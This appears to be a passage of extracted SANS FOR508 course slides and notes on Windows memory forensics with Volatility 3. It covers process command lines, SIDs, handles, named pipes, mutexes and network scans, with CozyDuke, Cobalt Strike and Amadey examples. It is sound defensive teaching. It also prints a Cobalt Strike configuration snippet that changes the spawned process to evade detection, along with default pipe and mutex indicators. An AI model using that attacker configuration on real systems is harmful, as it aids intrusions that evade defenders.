• Display process command lines from Process Enviro nment Block

Important Parameters
• Show information only for specific process IDs (--pi d)

Investigative Notes
• The command line displayed for the process provide s full path
information, including provided arguments
• Consider filtering the list to look for abnormal command lines
associated with common processes like “svchost.exe”
• Analyzing path information can identify processes loaded from
unusual locations or with missing/incorrect arguments
• PEB information is often unavailable for exited processes
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

63

Full path and command line information is far superior to simple process names for identifying anomalous
processes. Volatility provides a standalone plugin, windows.cmdline, to extract command line information
from the Process Environment Block (PEB) of each process. As discussed earlier, the EPROCESS block allows
only 14 bytes for an image name, so to get the full name, you must look within the PEB.

.

Information derived from this plugin provides an easy place to go threat hunting. Look for strange executable
names, unusual folders for executables to be stored and executed from, and incorrect arguments on well-known
processes. The SANS “Hunt Evil” poster can be a big help in this step as it documents all this information for
common system processes. Parsing the data with tools like grep can be useful; or export the data into CSV
format (“--r csv” option) and use a tool like Timeline Explorer to filter the results.
Unfortunately, PEB information for exited processes is often unavailable. In these situations, you may find
interesting process information via a plugin like windows.psscan but ultimately be unable to determine
information like the full path of the process due to that data residing in the missing PEB.
Equivalent plugins in Volatility 2: dlllist, cmdline

© 2023 SANS Institute

.

63

Analyze Process Objects: dlllist and cmdline (CozyDuke)

amdocl_as32.exe has a suspicious path, loaded DLL, and
unusual command line arguments

Arguments

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

CozyDuke is a remote access tool (RAT) in use by Russian nation-state actors known as APT29 or Cozy Bear.
These actors have been publicly identified in high-profile hacks around the world, including separate attacks
against the US White House, State Department, military Joint Chiefs of Staff, and election hacking (US
Democratic National Convention). During the analysis of a system infected with the CozyDuke RAT, we
identified a suspicious process named amdocl_as32.exe with a process ID of 2164. To gather more
information about a process, run the windows.dlllist plugin. Notice the use of the "--pid" parameter to limit the
results to a single process. The windows.dlllist output provides the full path used to execute the process:
Full Path: C:\Users\Admin\AppData\Roaming\ATI_Subsystem\amdocl_as32.exe
When running this plugin, focus on the executable command line first. Next, review the loaded DLLs for the
process to get further information about what capabilities it might be importing and to identify any malicious
DLL files that can help better understand the process. Pay close attention to the name of each DLL as well as
where the DLL is located. In this example, clearly the following DLL is related:
C:\Users\Admin\AppData\Roaming\ATI_Subsystem\atiumdag.dll
To get the full command line with arguments, we need to run a second plugin in Volatility 3, windows.cmdline.
The following arguments are returned for this process:
Arguments: C:\Users\admin\AppData\Roaming\ATI_Subsystem\atiumdag.dll,
ADL2_ApplicationProfiles_System_Reload 4832
This is an unusual command line, and it appears to indicate the executable is being used to load a DLL,
“atiumdag.dll”, from the same folder as the process executable. The additional arguments,
“ADL2_ApplicationProfiles_System_Reload 4832”, appear to be parameters to be passed to the loaded DLL. It
is also unusual to see processes run from a user’s AppData\Roaming folder. All of this information would likely
lead us to investigate this executable (and associated DLL) further. Interestingly, this version of CozyDuke uses
a renamed version of rundll32.exe to execute malicious code located in a DLL, which is what we see in this
example. The MD5 hash and digital signature of amdocl_as32.exe were legitimate (same as rundll32), but the
real malware (atiumdag.dll) was found by looking deeper into the process objects with these two plugins. Some
output columns were removed from this output to fit the slide.
64

© 2023 SANS Institute

.

64

.
© 2023 SANS Institute

.

65

Cobalt Strike Sacrificial Processes (1)
“So, why rundll32.exe? Why not something else? Honestly, it doesn’t matter what I pick.
Anything I pick is now the default. Because people rarely change defaults, it will show
up enough that someone will notice. The right thing here, for all parties, is to know how
to change the defaults. Fortunately, this isn’t too hard to do.” – Raphael Mudge

• Cobalt Strike regularly starts a new process and runs code within it
• rundll32.exe by default
• Required for x86->x64 mismatches
• Protects the Beacon implant in case of any crashes(mimikatz, powerpick,etc.)
• Passing sessions to remote systems (spawn)
• Makes code path and cleanup easier (psexec)

• The sacrificial process can be easily changed (but will be equally noisy)
• Hunting Tip: Look for many exited child processes under PowerShell and
WmiPrvSE. Review child process command line arguments for anomalies.
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

When running exploits or code through an implant there is a chance something could go wrong, crashing that
implant. Losing an implant could lead to losing access to an entire enterprise which is one reason you often see
multiple backdoors running during an attack. As insurance against crashing a primary process, malware authors
have taken an idea from the Microsoft playbook and developed sacrificial processes. Cobalt Strike makes heavy
use of sacrificial processes to achieve this stability in its “Beacon” backdoor. Above everything else, the
stability and flexibility of the toolkit is what has driven Cobalt Strike to be one of the most-used attack
frameworks of all time. Sacrificial processes work by spawning child processes to run potentially dangerous
code, providing many benefits beyond protection of the parent process. A sacrificial process makes it easy to
run 32-bit or 64-bit payloads (just spawn the process with the correct architecture), provides an easy and safe
place to inject code, makes passing code to other processes or systems easy, and facilitates cleanup since the
attack can be segmented and processes killed as they complete. However, the use of many child processes can
look very peculiar when analyzing memory, particularly because Cobalt Strike is heavily PowerShell-based. A
classic attack pattern for this toolkit is PowerShell spawning multiple rundll32.exe processes.
“So, why rundll32.exe? Why not something else?” Raphael Mudge, the creator of Cobalt Strike wrote:
“Honestly, it doesn’t matter what I pick. Anything I pick is now the default. Because people rarely change
defaults, it will show up enough that someone will notice. The right thing here, for all parties, is to know how to
change the defaults. Fortunately, this isn’t too hard to do.” [1] What he wrote rings true. Amazingly, even
advanced attackers often choose not to (or forget to) change the defaults. And even if the defaults are changed,
it will still look strange because there is no legitimate process name that spawns multiple copies of itself under
PowerShell.exe! Not only that, but by digging into the particulars of these processes we can often find
anomalies in their command-line arguments, security identifiers, and network activity. This is a classic example
of easy detection opportunities being derived through deeper understanding of how a tool operates.
[1] Why is rundll32.exe Connecting to the Internet?: https://for508.com/a62q3

66

© 2023 SANS Institute

.

66

Cobalt Strike Sacrificial Processes (2)

What is missing?

post-ex {# change the temporary process we spawn to svchost
set spawnto_x86 "%windir%\\syswow64\\svchost.exe";
set spawnto_x64 "%windir%\\sysnative\\svchost.exe"; }
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

67

.

Here we see the Volatility 3 windows.cmdline plugin used to dig deeper into a process with PID 7100. This
particular process was singled out because it was an orphan process (and also, because we now know it is a very
commonly abused process). What is missing from the command line in this output? Rundll32.exe is designed
to execute code present in DLLs. Thus, its command line arguments should at a minimum include what DLL
will be loaded! The lack of any command line arguments make this a very suspicious version of rundll32.exe.
Our next step would likely be to dump the process memory (Step 6 of our memory analysis process) and try to
determine what code is actually running in this likely sacrificial process.
It is important to emphasize that rundll32.exe is just the default sacrificial process used by Cobalt Strike.
Customization is a hallmark of this toolset, and the process can be easily changed by editing the Cobalt Strike
“artifact kit” or “malleable C2 profile.” [1] This slide shows the simple changes required to changes the
sacrificial process to “svchost.exe.” But luckily for us, there is almost no process this could be changed to that
would not stick out to someone trained in memory forensics!
[1] Cobalt Strike Post-Ex Omakase Shimasu: https://for508.com/ky74p

© 2023 SANS Institute

.

67

Analyze Process Objects: windows.getsids.GetSIDs

Purpose
• Display Security Identifiers (SIDs) for each process

Important Parameters
• Show information only for specific process IDs (--pi d)

Investigative Notes
• Token information for a suspected process can be us eful to
determine how it was spawned and with what permissions
• Group membership gives context on account capabilities
• Identifying a system process (e.g., svchost.exe) with a user SID
(e.g., S­1­5­21­1993962763­1547161642­299502267­1003) is an important
clue that something is awry
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

PID
700
700
700
700
700

Process
lsass.exe
lsass.exe
lsass.exe
lsass.exe
lsass.exe

.

Every process inherits an access token from the account spawning it. A token is a collection of security
identifiers (SIDs) that describe user permissions and user groups. A review of process tokens can help identify
malicious processes and link together processes spawned with the same compromised account. Most system
processes use well-known system accounts and security identifiers to perform their tasks. Microsoft provides a
reference to these on its support site.[1] As an example SIDs from a legitimate "lsass.exe" process might be:
SID
Name
S-1-5-18
Local System
S-1-5-32-544 Administrators
S-1-1-0
Everyone
S-1-5-11
Authenticated Users
S-1-16-16384 System Mandatory Level

This process (PID 700) was apparently spawned using the Local System account as evidenced by the first entry,
representing the primary token (other SIDS refer to group membership). This output is normal, but if you were
to see this process running with user privileges (indicated by a user account SID being present), that might be an
important clue that something is amiss:
556

lsass.exe

S-1-5-21-4251235867-3156790139-409172211-1001 Steve.Rogers

User SIDs are assigned to processes started under a user context, which would never be the case for core system
processes like the lsass.exe process. As explained by Microsoft: "An access token is an object that describes
the security context of a process or thread. The information in a token includes the identity and privileges of the
user account associated with the process or thread. When a user logs on, the system verifies the user's password
by comparing it with information stored in a security database. If the password is authenticated, the system
produces an access token. Every process executed on behalf of this user has a copy of this access token."[2] The
Microsoft article, "How Access Tokens Work", is also an excellent reference on the subject.[3]
Equivalent plugin in Volatility 2: getsids
68

© 2023 SANS Institute

.

68

The windows.getsids plugin attempts to query in-memory registry hives to match account SIDs to their
account names. If it is successful, account names will follow the SID information (as seen in the example
above). However, there are times when this lookup will fail. In these cases, the analyst can perform their own
lookups using SAM or SOFTWARE registry hives taken from the subject system.

.

[1] Well-known security identifiers: http://for508.com/q-lr9
[2] Access Tokens: http://for508.com/a0csp
[3] How Access Tokens Work: http://for508.com/7bgu1

© 2023 SANS Institute

.

69

Understanding Security Identifiers (SIDs)

• A SID identifies a user or group
• Also represents a privilege level similar to Unix UID/GID
Well-Known Account SIDs

Well-Known Group SIDs

LocalSystem

S­1­5­18

Administrators

S­1­5­32­544

LocalService

S­1­5­19

Users

S­1­5­32­545

NetworkService

S­1­5­20

Guests

S­1­5­32­546

• A user account consists of a unique domain identifier and
relative identifier for that account

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Security Identifiers (SIDs) are unique identifiers assigned to objects by Windows systems and domain
controllers. Behind the scenes, Windows uses these SIDs to reference specific accounts and to check security
privileges for those accounts. SIDs will be unique within a Windows instance, and domain SIDs will be unique
throughout the enterprise.

.

In memory forensics, we often review SID information in the context of a process. Each running process is
assigned an access token that contains the user account SID, SIDs for every group that the user is a member
(including the primary group), and a list of privileges and ACLs related to the user account.[1] Most importantly,
this information tells us what user account spawned each process. The group information stored by the process
gives us additional clues as to the permissions afforded that particular account (for example, if the account is a
Domain Administrator or member of the Remote Desktop Users group).
As you might expect, nearly all Windows system processes are spawned by built-in Windows accounts. These
built-in accounts have well-known SIDs associated with them that look much different than a user account SID.
The three most popular SIDs used are listed on this slide (LocalSystem, LocalService, and NetworkService).
Groups also have well-known SIDs that are well documented by Microsoft.[2] If you see a longer SID assigned
to a process, this means that a user account was used to spawn that process. If that process happens to be
Chrome.exe, that is normal because Google Chrome is expected to run under a user context. On the other hand,
if the process is Svchost.exe, that would be abnormal.
Breaking a user SID into its component parts can be instructive:
S-1-5-21-1004336348-1176238915-682003330-1004
•
•
•

S: Indicates that the string that follows is a SID.
1: Revision Level for the type of SID (we are still in the first revision).
5: Identifier Authority is the most typical issuing authority—in rare cases, you might see others like World
Authority (1) and Creator Authority (3).

70

© 2023 SANS Institute

.

70

•

•

21-1004336348-1176238915-682003330: A unique identifier for a specific domain that the
account belongs to. Each domain in an enterprise will be assigned a unique identifier. Each domain account
will contain this domain identifier as part of its SID.
1004: The relative identifier (RID) for the account within that domain. Every account will have a unique
RID within the domain.

The complete SID+RID is the value Windows uses to reference a particular user account. SIDs are
everywhere you look in Windows. We commonly encounter them during forensic investigations in the
Registry, event logs, and, of course, in process tokens.

.

[1] Access Tokens: http://for508.com/upboe
[2] Well-Known SID Structures: http://for508.com/r-cvo

© 2023 SANS Institute

.

71

Analyze Process Objects: windows.getsids.GetSIDs

amdocl_as32.exe has a user SID, indicating it was not
spawned by a built-in system account

Account SID

Group
Info

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this example, we are diving deeper into a suspicious process named “amdocl_as32.exe", previously identified
as suspicious. The process is named to blend in as a legitimate system process (the name is also used by a
legitimate executable from the AMD chip manufacturer). A review of its security identifiers (SIDs) with the
windows.getsids plugin shows a user SID associated with the process. Although this does not necessarily
mean the process is malicious, it does tell us the process was likely spawned from a user context and hence is
unlikely to be a true system process. The other SIDs, shown below the SID, are group SIDs. For instance, we
can tell that the user account that spawned “amdocl_as32.exe” was the “Admin” account which was a member
of the built-in Administrators group, but not a domain admin (the domain admin group relative identifier is 512,
not 544 as shown for this account).
A great way to learn more about SIDs and group information is to run the command whoami /all from a
Windows command prompt. It will nicely show the currently logged-in user’s SIDs, groups, and privileges
assigned.

72

© 2023 SANS Institute

.

72

.ir
01
de
hi
© 2023 SANS Institute

.

73

Analyze Process Objects: windows.handles.Handles (1)

Purpose
• Print list of handles opened by the process

Important Parameters
• Show information only for specific process IDs (--pi d)
• Output in CSV format (-r csv)

Investigative Notes

• A process can have hundreds or even thousands of h andles;
reviewing them can be like searching for a needle in a haystack
• Limit your search by filtering for specific types of handles; File
and Registry handles are excellent for quick wins
• Also, useful to audit more specialized handles like named pipes
and mutants
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Handles are important process objects for our analysis, but they can be difficult to analyze because they are so
numerous. Unless the malware is well known or you are lucky, they rarely are the first item pointing to a
suspicious process. More commonly, they are reviewed for specific processes that are already suspected of
being malicious. Used in this manner, they can be very helpful for confirming suspicions, identifying malware
variants, and identifying additional objects to investigate.
By default, the windows.handles.Handles plugin will output every handle for every available process. The "-pid" argument can be helpful to narrow focus to only a subset of processes. There are many handle types, with
only a handful being particularly useful in most investigations. File and Registry handles are particularly useful
since they can lead examiners to interesting artifacts on which to pivot. We will also cover more specialized
handles like named pipes and mutants in this section. There can be a lot of uninteresting information present in
the process handle table, making filtering important to reduce noise. As an example, a process can have many
unnamed handles, which are typically created and used only internal to the process and hence are usually
uninteresting for our purposes. Volatility 2 included an option to remove these (the -s argument), but in
Volatility 3 this must be done in post-processing by removing blank entries from the “Name” column. Filtering
can either be performed on the command line using traditional Linux tools like grep and awk, or by using the “-r
csv” option in Volatility 3 to output into CSV format.
Equivalent plugin in Volatility 2: handles. In Volatility 2, the “-t” argument limits output by handle type (e.g.,
-t File,Key).

74

© 2023 SANS Institute

.

74

Analyze Process Objects: windows.handles.Handles (2)

A file handle for an interesting DLL is present in the web
server w3wp.exe process (compiled version of the webshell)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

75

As processes related to an attack are identified, it is worth your time to quickly review associate handles. Nine
times out of ten you will find nothing, but it is not uncommon to discover new information about the process that
can further your investigation and inspire the development of interesting indicators of compromise.

.

The example on this slide continues our investigation into a previously identified webshell. The parent process
of the webshell was “w3wp.exe” PID 3196. While reviewing file and registry handles for this process, several
file and folder names were identified for deeper analysis. Handles represent “pointers” to objects, and it is not
unusual for a process to have a pointer to a file it is reading or writing to. However, this is not the common way
code is loaded into a process, so it is unusual to see a DLL file referenced in a process handle (recall that loaded
DLLs are typically referenced in the Process Environment Block and displayed via the windows.dlllist
plugin). The name and location of this DLL file also appeared interesting. Further analysis of this DLL,
“App_Web_6bl2f3yv.dll” indicated it was the compiled version of an .aspx webshell and additional files of
interest were found with it in the “Temporary ASP.NET Files” folder.

© 2023 SANS Institute

.

75

.
76

© 2023 SANS Institute

.

Analyze Process Objects: windows.handles.Handles (3)

File handles found in a SolarMarker infected system identify a
randomly named registry key and the original infection vector.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

77

.

After processes of interest are identified, the logical next step is to dig deeper into those processes. Process
objects like handles can provide more context about process activities. The example on this slide comes from a
system infected with SolarMarker, also known as Jupyter. SolarMarker is an infostealer targeting stored
browser data like passwords and credit card data, in addition to crypto wallets present on a system. It uses many
defense evasion techniques to evade discovery, making it an interesting malware variant to investigate.[1]
Imagine picking out “powershell.exe” and “msiexec.exe” as processes that could be related to a system
compromise. Both are very frequently employed by modern malware as living off the land attacks proliferate.
With experience, you will learn that PowerShell processes often have a large number of handles. In this
particular example PID 5352 had 724 handles! However, by filtering out unnamed (blank names) handles and
focusing on file and registry key handles that number became 140. It is very possible that many analysts would
miss the randomly named registry key pointed out on the slide. It blends in quite well and might require some
knowledge of what the “CLASSES” key looks like to be sure it is of interest (as homework, look at this key on a
test system). But if you had a good day and flagged it for further review, you just found the malware
persistence, which was stored in a series of randomly named registry keys. Storing scripts and data in randomly
named registry keys has become a common technique for “fileless” malware, so it pays to keep an eye out
strange key names.
The interesting handle in the “msiexec.exe” PID 6192 process is a little more obvious. This process only had 16
file handles. If you think about the purpose of “msiexec.exe” (installing .msi files), finding a reference to
“flash_installer.msi” likely indicates what was installed on the system. The name and folder location are of
particular interest and ultimately led to recovery of the original infection vector.
[1] Jupyter Infostealer is a Master of Disguise: https://for508.com/pfk73

© 2023 SANS Institute

.

77

.
78

© 2023 SANS Institute

.

Analyze Process Objects: Named Pipes & Cobalt Strike

MSSE-####-server is a default named pipe used in Cobalt Strike
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

79

.

Named pipes are an incredibly common component of many advanced attack tools. Psexec, Metasploit,
Trickbot, HyperStack, Empire, Covenant, Cobalt Strike, and many others utilize named pipes for
communication to better blend in and evade detection. Named pipes provide similar functionality to opening a
network socket and communicating over the SMB protocol with less overhead and less chance of someone
noticing something wrong while running “netstat.” [1] Pipes can be named anything, so they can be difficult to
identify. However, sometimes things stick out with some connected pipes appending IP addresses or process
identifiers as part of the pipe name. As an example, PsExec often embeds several markers into its named pipes
naming them similar to \Device\NamedPipe\psexecsvc-<remote hostname>-<PID>-stdout.
Many attack tools use standard pipe names, which make excellent indicators of compromise. Cobalt Strike
extensively uses the following default pipe names (notice how some, like “postex_ssh” and “msagent”,
might seem immediately interesting to an astute analyst):
MSSE-####-server
msagent_##
status_##
postex_ssh_####
\\.\pipe\####### (7-10 random characters)
postex_####
These pipe names can be changed, but often are not, and once a Cobalt Strike Beacon backdoor is found the
pipe information can be easily extracted from the executable to look for elsewhere. The example on this slide
shows a Cobalt Strike instance that did not change the defaults making identification easy (the pipe MSSE####-server was present in two processes: System and powershell.exe). Named pipes can be identified via
“File” handles in Volatility and thus when narrowing your focus, you can filter your output on that handle type
(this was not done in the example on the slide since output was filtered with grep for the text “pipe”).
[1] Named Pipes | Microsoft Docs: https://for508.com/th5r7

© 2023 SANS Institute

.

79

Analyze Process Objects: Mutants and Threat Intel

• Mutants are process
objects sometimes
used by malware to
“mark territory”
• Usually identified by
reverse engineers,
they make excellent
indicators of
compromise
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Mutants are another type of handle present in the process handle table. Also called “mutexes”, these process
objects control or limit access to a resource. For instance, a mutant might be used by an object to enforce that
only one process at a time can access it. However, this is not why malicious software typically use them.
Malware commonly sets mutants as a way of "marking" a compromised system to prevent reinfection. The
malware will first check for the absence of its mutant before performing an infection. During code analysis,
reverse engineers can identify what mutant name is set and checked for by the malware. Since mutant names
must be unique to be useful in this context, they make excellent indicators of compromise. Two notable
examples of recent malware using mutants as kill switches include the destructive ransomware WannaCry, with
a mutant named “MsWinZonesCacheCounterMutexA0”, and credit card scraper BlackPOS, using a mutant
named “nUndsa8301nskal”.
In this example, we see a mutant identified from PID 2164, which we previously identified as a suspicious
process. A mutant present, “Mtx”, has been documented as a well-known marker for the CozyDuke remote
access tool.[1] This is further validation that we are correct in identifying this process as suspicious and has the
added benefit of immediately identifying the malware sample.
Keep in mind an investigator is almost never going to be able to look at a list of mutants and pick out the “bad”
one. They can be named anything and are often named to blend in. The way they are commonly used is AFTER
the malware has been found and identified. Once the mutant has been identified via code analysis, investigators
(or more commonly, automated indicator of compromise scanners) can use known bad mutants as an easy way
to recognize compromised systems.
[1] CozyDuke (PDF): http://for508.com/8ha5r

80

© 2023 SANS Institute

.

80

.
© 2023 SANS Institute

.

81

Analyze Process Objects Review

• In many cases, the objects that make up a process
will provide a clue that something is amiss
• DLLs
• Account SID
• Handles
• There can be thousands of objects associated with a
given process
• Narrow the focus to suspect processes or those known to be often
subverted (e.g., svchost.exe, services.exe, rundll32.exe)
• Check process command line, DLL file paths, account SID, and use
handles when necessary to provide additional confirmation
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

We started our analysis checklist with reviewing process attributes because they are less numerous, and
anomalies are often easy to spot. When you move on to process objects, our job becomes more difficult. Now
instead of maybe a hundred or fewer processes to review, you might have thousands of process objects. By
narrowing your focus to objects associated with specific processes, you can greatly reduce the work. Handles
are by far the most voluminous and output can be further filtered to show only the specific handle types you
might be interested in such as registry keys, files, and named pipes. Don’t worry about missing something—our
analysis process is designed to be layered, so even if you miss something in this step, there is a good chance
another clue will be discovered in a different step.

82

© 2023 SANS Institute

.

82

Step 3:
Review Network Artifacts

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

83

.

This page intentionally left blank.

© 2023 SANS Institute

.

83

Network Artifacts
Suspicious Ports
• Communication via
abnormal ports?
• Indications of forwarders
or redirectors?

Suspicious
Connections
• External connections
• Connections to known
bad IPs
• TCP/UDP connections
• Creation times

Suspicious Processes
• Why does this process
have network capability
(open sockets)?
• Does network activity
match the process type?

Examples of Suspicious Network Connections
Any process communicating over port 80, 443, or 8080 that is not a browser
Any browser not communicating over port 80, 443, or 8080
Connections to unexplained internal or external IP addresses
Web requests directly to an IP address rather than a domain name
RDP connections (port 3389), particularly if originating from odd or external IP addresses
DNS requests for unusual domain names
Workstation to workstation connections
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Network connections are a tried-and-true method for finding malware. Do you remember those old listening
ports for the original remote access tools like Back Orifice? Although it isn’t quite that easy these days with
outbound beaconing at infrequent intervals being the norm, network analysis often leads us in the right
direction. There are several things to look for when analyzing network connections for suspicious activity:
• Suspicious ports: Although we don’t see listening ports serving as backdoors nearly as frequently, they are
still out there. Pay attention to what ports are active on a typical system in the environment and look for
those that don’t fit. What is that strange process communicating via port 445? The System process usually
handles SMB protocol ports, so if the owning process is different, you could have found something
interesting like an internal Cobalt Strike chained SMB beacon. Port forwarders or redirectors can also be
discovered via anomalous listening ports.
• Suspicious connections: Modern malware has largely moved to outbound connectivity (for example,
command and control communications) over highly utilized ports, such as 80 and 443. Although this traffic
blends in well, it is still possible to detect, especially during memory analysis. In fact, this can sometimes
be advantageous. Instead of seeing a connection from a svchost.exe process to a random high port, if you
see that same connection communicating to port 80 of an external machine, you can be much more assured
that it is a malicious connection. Pay attention to the ports used and what that tells you about directionality.
A reserved or well-known port often indicates an inbound connection. Whether the suspicious connection
was activated inbound or outbound might give you more information about the malware and your own
network defenses. Don’t focus only on TCP connections as some malware purposely uses UDP. For
instance, many malware variants have used UDP for peer-to-peer communication with their command and
control servers. DNS tunneling attacks also routinely use UDP over port 53. Finally, don’t forget that
network sockets have a creation time. This can be very useful for finding other artifacts like related
processes and threads initiated near the same time.
• Suspicious processes: Should the process communicate via the network at all? One of the amazing
abilities we have with memory analysis is that old, terminated network sockets might still be recovered out
of memory. Thus, even if the evil process wasn’t communicating during the short time when memory was
acquired, we have a chance to identify it with previously opened sockets.

.

✓
✓
✓
✓
✓
✓
✓

84

© 2023 SANS Institute

.

84

When looking for unusual network behavior, keep an eye out for the following:
• Any process communicating over port 80, 443, or 8080 that is not a browser
• Any browser process not communicating over port 80, 443, or 8080
• Connections to unexplained internal or external IP addresses. For example, why did a process have a TCP
connection to a system in Russia? External resources like IP reputation services can also provide
additional context.
• Web requests directly to an IP address rather than a domain name
• RDP connections (port 3389), particularly if originating from odd IP addresses. External RDP connections
are typically routed through a VPN concentrator.
• DNS requests for unusual domain names
• Workstation to workstation connections. Workstations don’t typically RDP, map shares, or authenticate to
other workstations. The expected model is workstations communicate with servers. Workstation to
workstation connections often uncover lateral movement.

de

01

.ir

Since any of these items can be “normal” activity, it is extremely helpful to have a baseline of what normal
network traffic looks like in the environment you are investigating. Taking time to build a baseline before an
incident makes finding deviations much easier.

hi

Notice the spinlock.exe process identified in the image above. There might be multiple reasons an analyst
would target that process. Its name alone might be suspicious, as it is not a common executable to be found
running on Windows systems. Further, it is communicating to an external IP over port 443 (SSL). This port is
very commonly used for malicious outbound communication channels (in addition to plenty of legitimate
traffic!). Those two facts together would cause a good analyst to dig a bit further to at least try and find more
information on spinlock.exe. An excellent next step would be to perform a WHOIS lookup on the external IP
to see if that gives any clues to whether the network connection is legitimate. There is much more to analyze
in this output. As an example, is it normal for Skype to communicate via port 443? Should Skype be running
on this system? Is “Skype.exe” really Skype or malware named to blend in as Skype? Why is the Skype
process also communicating with an internal IP (10.3.16.15)? In this case, “Skype.exe” was legitimate and
just happens to have a lot of strange network artifacts. The better you know normal network activity in the
environment being investigated, the faster you can answer many of these questions.

© 2023 SANS Institute

.

85

Volatility Network Artifact Plugins

windows.netstat

Report network information using standard network object lists

windows.netscan

Scan for both connections and sockets within memory

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In Volatility 3 there are two primary plugins to provide information on network artifacts found in a memory
image. Similar to the structure of the process plugins, network plugins in Volatility 3 have two different
methods: the high-level method of finding and parsing the existing object lists and the brute force method of
scanning memory for any references to the network artifacts. The windows.netstat plugin follows the standard
path: find the tcpip.sys driver in memory and parse the structures present in its UdpCompartmentSet,
TcpCompartmentSet, and TCP Endpoint partition table lists. This information gives insight into network activity
present when the memory image was acquired. The windows.netscan plugin takes a more brute force approach.
Instead of finding and parsing existing structures, it carves data from non-paged pool memory looking for
signatures for well-known network objects. As examples, the signature (aka pool tag) is TcpE for a TCP
endpoint, TcpL for a TCP listener, and UdpA for a UDP endpoint. This approach can provide more information,
including old network objects and any structures purposely unlinked by malware trying to hide. The only
downside is pool tag scanning can result in false positives or in partially overwritten remnant structures,
occasionally providing unreliable information. A combination of both plugins gives the best of both worlds.
Network analysis in Volatility 2
The network artifact plugins are the only set of plugins in Volatility 2 which are operating system dependent.
Major changes were made to the TCP/IP stack in Microsoft Vista, changing the underlying data structures in
memory and making it much more difficult to find the linked lists pointing to those structures. Instead of
updating the existing plugins to work on newer systems, the Volatility team opted to create a new plugin,
netscan. The good news is it combines both socket and TCP connection data into one output, making review
faster and similar to well-known tools like netstat. It should be used for all Windows operating systems postWindows XP. Windows XP-based systems require multiple different plugins in Volatility 2. The connections
plugin follows the standard path: finding tcpip.sys in memory and walking the TCP connections single-linked
list. This information gives us the network connections open when the memory image was acquired. The
connscan plugin takes the brute force approach, searching non-paged pool memory in the same fashion as the
windows.netscan plugin in Volatility 3. Unlike the other operating systems, XP analysis also requires separate
plugins to fully enumerate network sockets. The sockets plugin walks the socket single-linked list and reports
information from referenced socket structures while the sockscan plugin searches for these objects.

© 2023 SANS Institute

86

.

86

Network Artifacts: windows.netscan & windows.netstat

Purpose
• Identify network sockets and TCP/UDP memory resident objects

Important Parameters
• Deep scan – greater % of false positives (--include-corrupt)

Investigative Notes
• Both active (established) and terminated (closed) TCP connections
and sockets may be returned
• Pay close attention to the process attached to the connection. Does
a socket or network connection for that process make sense?
• Creation times available for both sockets and TCP connections
• Run both plugins – either may display unique information
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Discovering memory-resident network artifacts using Volatility 3 is straightforward. We have a linked-list based
plugin (windows.netstat) and a scanning based plugin (windows.netscan). One of the most powerful
capabilities of this step in our process is network objects can persist in memory for long periods after a
connection has been terminated. This is helpful because command and control connections often beacon at
intervals and may not be active during the time of memory acquisition. The windows.netscan plugin is
particularly well suited to carve old network structures out of memory. If you want to leave no stone unturned,
add the “--include-corrupt” option for an even deeper scan (with the added chance of false positives and garbage
data being included in your output). In practice, we recommend running both windows.netscan and
windows.netstat as each can point to network activity missed by the other.
Keep in mind the goal of each step in our process is to look for anomalies. What processes are communicating
on the network? Are they communicating to any unusual locations or using any unusual network protocols? Pay
close attention to the process owner of the connection. Every socket and TCP/UDP connection is tied directly to
a process. If you notice strange network activity from processes that should be only communicating in the local
network (or not communicating at all), it can be powerful evidence that the process has been compromised. In
addition to process information, we can also take advantage of creation times (though not every Volatility
profile provides this information). Since Windows has the wonderful features of tying processes to network
objects and storing creation times, items found here can be easily cross-referenced with findings from other
memory analysis steps. For each identified network object, the plugins provide:
• Memory location (Offset)
• Protocol (Proto)
• Local IP Address and Port (LocalAddr and LocalPort)
• Foreign IP Address and Port (ForeignAddr and Foreign Port)
• Process Identifier (PID)
• Process Name (Owner)
• Creation Time (Created)

87

© 2023 SANS Institute

.

87

Network Artifacts: windows.netscan.NetScan

Multiple Amadey processes can be identified
communicating via ports 80 and 443 (HTTP/S)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this example, we see output from the Volatility 3 windows.netscan plugin. Following our standard
analysis process, we look for anomalous open sockets, suspicious TCP connections, and any processes which
should not be communicating on the network. A good area to start with is Owner process information. You
might notice two strangely named processes beginning with the characters “Sun”. They look like randomly
named processes and in fact are randomly named by the infamous Amadey malware present on the system.
Notice the ForeignAddr and ForeignPort information for these processes. Process ID 6864 looks like a common
outbound beacon, with a port 443 (HTTPS) connection outbound to an external IP. A reputation lookup of this
IP will lead you to multiple online sandboxes with malware samples using this address. The network connection
from PID 5076 would also be interesting based on its unusual ForeignPort attempt (port 51630). While those
are the most obvious processes to review, notice there are several additional processes also communicating to
external IP addresses using port 443. All of these appear to have legitimate process names (svchost.exe,
OneDrive.exe, etc.), but process names could be faked. Document their process identifiers (PIDs) and if you see
any other strange activity related to these processes in other steps, you will be reminded to look deeper.
Alternatively, IP lookups like WHOIS might provide enough context for you to trust the network connections.
As an example, the “OneDrive.exe” process, PID 6112, appears to be communicating to a known Microsoft
address. Finally, among all the other interesting things to look at, you might have noticed the process
“tkools.exe”. This process also has the interesting pattern of a web port (80/HTTP) connecting to an external IP
address. This process is also part of the Amadey malware infecting this particular system.
Some output columns were removed from this output to fit on the slide. Also note that this example was sourced
from a different compromised system than the Amadey image you will be investigating in a future lab.

88

© 2023 SANS Institute

.

88

.
© 2023 SANS Institute

.

89

Introducing MemProcFS

• Mount a Windows memory image as a virtual file system
• Auto-profile detection using Microsoft symbols

• Memory objects are files and can be opened with other tools
• Editors, hex disassemblers, YARA or anti-virus, grep, etc.

